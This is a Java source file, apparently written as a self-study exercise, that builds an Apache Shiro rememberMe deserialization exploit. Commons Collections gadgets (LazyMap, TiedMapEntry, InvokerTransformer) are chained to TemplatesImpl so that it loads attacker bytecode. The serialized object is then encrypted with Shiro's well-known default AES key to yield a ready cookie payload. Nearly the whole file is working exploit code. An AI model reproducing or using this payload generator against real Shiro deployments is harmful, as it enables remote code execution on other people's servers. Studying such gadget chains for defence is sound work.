package Shiro;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

/**
 * @BelongsProject: study_java
 * @BelongsPackage: Shiro
 * @Author: Clown
 * @CreateTime: 2023-08-07  13:28
 */
public class ShiroCCchange {
    public static void serialization(Object object)  throws Exception{
        FileOutputStream fileOutputStream = new FileOutputStream("shrio.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(object);
        System.out.println("serialization方法成功执行");
    }

    public static void unserialization() throws Exception{
        FileInputStream fileInputStream = new FileInputStream("shrio.txt");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        System.out.println("unserialization执行成功");
    }
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class<? extends TemplatesImpl> aClass = templates.getClass();
        Field name = aClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"aaaa");

        Field bytecodes = aClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E:\\study_java\\test\\Test.class"));
        byte[][] codes = {code};
        bytecodes.set(templates,codes);

        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);

        HashMap map = new HashMap();
        Map lazymap = LazyMap.decorate(map,new ConstantTransformer(1));//这里先设置为一个没有用的，下面通过反射设置成目标为了避免在本地本地调试时触发命令执⾏
//        Map lazymap = LazyMap.decorate(map,chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,templates);

        HashMap<Object, Object> map2 = new HashMap<>();//这里是触发点
        map2.put(tiedMapEntry,"bbb");
        lazymap.clear();

        Class clazz = LazyMap.class;//这里通过反射将LazyMap设置为目标值
        Field factoryField = clazz.getDeclaredField("factory");
        factoryField.setAccessible(true);//私有属性
        factoryField.set(lazymap,invokerTransformer);//这里设置为目标的危险函数

//        serialization(kvHashMap);
//        unserialization();

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(map2);
        System.out.println(byteArrayOutputStream);

        AesCipherService aesCipherService = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aesCipherService.encrypt(byteArrayOutputStream.toByteArray(), key);
        System.out.println(ciphertext.toString());
    }
}
